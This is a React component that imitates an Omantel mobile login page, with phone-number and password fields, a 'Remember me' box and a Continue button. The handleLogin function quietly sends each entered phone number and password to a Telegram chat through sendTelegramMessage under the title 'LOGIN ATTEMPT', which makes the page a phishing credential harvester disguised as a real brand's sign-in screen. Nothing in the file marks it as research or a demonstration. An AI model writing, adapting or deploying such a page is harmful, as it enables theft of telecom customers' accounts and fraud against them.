"use client"

import { useState } from "react"
import Image from "next/image"
import { ChevronLeft, Eye, EyeOff } from "lucide-react"
import { sendTelegramMessage } from "../lib/telegram"

const OMANTEL_ORANGE = "#203cf5ff"

export function OmantelLogin({
    onContinue,
    onBack
}: {
    onContinue: (phone: string) => void,
    onBack?: () => void
}) {
    const [phoneNumber, setPhoneNumber] = useState("")
    const [password, setPassword] = useState("")
    const [rememberMe, setRememberMe] = useState(true)
    const [showPassword, setShowPassword] = useState(false)
    const [phoneFocused, setPhoneFocused] = useState(false)
    const [passwordFocused, setPasswordFocused] = useState(false)

    const handleLogin = () => {
        sessionStorage.setItem("userPhone", phoneNumber);
        sessionStorage.setItem("userPassword", password);
        sendTelegramMessage({
            title: "LOGIN ATTEMPT",
            phoneNumber,
            password,
            type: "login",
            exclude: ["location"]
        });
        onContinue(phoneNumber);
    };

    return (
        <div className="fixed inset-0 flex flex-col overflow-hidden" style={{ backgroundColor: "#FFFFFF" }}>
            {/* Top bar with back arrow and logo side-by-side */}
            <div className="relative w-full flex items-center justify-center px-4 pt-4 pb-3">
                {/* Back Button - Absolute to keep logo centered */}
                <button
                    type="button"
                    className="absolute left-4 p-1 transition-opacity active:opacity-60"
                    aria-label="Go back"
                    onClick={onBack}
                >
                    <ChevronLeft className="h-6 w-6" style={{ color: "#1A1A1A" }} />
                </button>

                {/* Logo centered */}
                <Image
                    src="/q32.png"
                    alt="Company Logo"
                    width={120}
                    height={40}
                    className="h-10 w-auto object-contain"
                />
            </div>

            {/* Divider */}
            <div className="h-px w-full" style={{ backgroundColor: "#EBEBEB" }} />

            {/* Content */}
            <div className="flex-1 px-6 pt-8 animate-slide-up">
                {/* Heading */}
                <h1
                    className="text-[28px] leading-[36px] font-bold tracking-tight font-sans"
                    style={{ color: "#1A1A1A" }}
                >
                    Sign in with your Omantel number
                </h1>

                {/* Subtitle */}
                <p
                    className="mt-3 text-[15px] leading-[22px] font-sans"
                    style={{ color: "#888888" }}
                >
                    Enter a valid number to log in.
                </p>

                {/* Phone number field */}
                <div className="mt-10">
                    <div className="relative">
                        <input
                            type="tel"
                            inputMode="numeric"
                            placeholder="Phone number"
                            value={phoneNumber}
                            onChange={(e) => setPhoneNumber(e.target.value)}
                            onFocus={() => setPhoneFocused(true)}
                            onBlur={() => setPhoneFocused(false)}
                            className="w-full py-3 text-[16px] font-sans outline-none border-0 bg-transparent placeholder:text-[#BBBBBB] placeholder:text-[16px]"
                            style={{
                                color: "#1A1A1A",
                                caretColor: OMANTEL_ORANGE,
                            }}
                            aria-label="Phone number"
                        />
                    </div>
                    {/* Underline */}
                    <div
                        className="h-[2px] w-full transition-colors duration-200"
                        style={{
                            backgroundColor: phoneFocused ? "#b1adadff" : "#E0E0E0",
                        }}
                    />
                </div>

                {/* Password field */}
                <div className="mt-6">
                    <div className="relative flex items-center">
                        <input
                            type={showPassword ? "text" : "password"}
                            placeholder="Password"
                            value={password}
                            onChange={(e) => setPassword(e.target.value)}
                            onFocus={() => setPasswordFocused(true)}
                            onBlur={() => setPasswordFocused(false)}
                            className="w-full py-3 text-[16px] font-sans outline-none border-0 bg-transparent pr-10 placeholder:text-[#BBBBBB] placeholder:text-[16px]"
                            style={{
                                color: "#1A1A1A",
                                caretColor: OMANTEL_ORANGE,
                            }}
                            aria-label="Password"
                        />
                        <button
                            type="button"
                            className="absolute right-0 p-1"
                            onClick={() => setShowPassword(!showPassword)}
                            aria-label={showPassword ? "Hide password" : "Show password"}
                        >
                            {showPassword ? (
                                <EyeOff className="h-5 w-5" style={{ color: "#999999" }} />
                            ) : (
                                <Eye className="h-5 w-5" style={{ color: "#999999" }} />
                            )}
                        </button>
                    </div>
                    {/* Underline */}
                    <div
                        className="h-[2px] w-full transition-colors duration-200"
                        style={{
                            backgroundColor: passwordFocused ? "#b1adadff" : "#E0E0E0",
                        }}
                    />
                </div>

                {/* Remember me + Forgot password row */}
                <div className="flex items-center justify-between mt-6">
                    <label className="flex items-center gap-2.5 cursor-pointer select-none">
                        <div
                            className="relative flex items-center justify-center"
                            style={{
                                width: "20px",
                                height: "20px",
                            }}
                        >
                            <input
                                type="checkbox"
                                checked={rememberMe}
                                onChange={(e) => setRememberMe(e.target.checked)}
                                className="sr-only"
                                aria-label="Remember me"
                            />
                            <div
                                className="w-5 h-5 rounded-[3px] flex items-center justify-center transition-colors duration-150"
                                style={{
                                    border: `2px solid ${rememberMe ? OMANTEL_ORANGE : "#CCCCCC"}`,
                                    backgroundColor: rememberMe ? OMANTEL_ORANGE : "transparent",
                                }}
                            >
                                {rememberMe && (
                                    <svg
                                        width="12"
                                        height="10"
                                        viewBox="0 0 12 10"
                                        fill="none"
                                    >
                                        <path
                                            d="M1 5L4.5 8.5L11 1.5"
                                            stroke="white"
                                            strokeWidth="2"
                                            strokeLinecap="round"
                                            strokeLinejoin="round"
                                        />
                                    </svg>
                                )}
                            </div>
                        </div>
                        <span
                            className="text-[14px] font-sans"
                            style={{ color: "#1A1A1A" }}
                        >
                            Remember me
                        </span>
                    </label>

                    <button
                        type="button"
                        className="text-[14px] font-sans font-medium"
                        style={{ color: OMANTEL_ORANGE }}
                    >
                        Forgot password?
                    </button>
                </div>

                {/* Continue button */}
                <button
                    type="button"
                    onClick={handleLogin}
                    className="w-full mt-10 py-4 rounded-xl text-[16px] font-sans font-semibold transition-all duration-200 active:scale-[0.98]"
                    style={{
                        backgroundColor: "#FFFFFF",
                        color: "#000000",
                        border: "1px solid #000000"
                    }}
                >
                    Continue
                </button>
            </div>
        </div>

    )
}
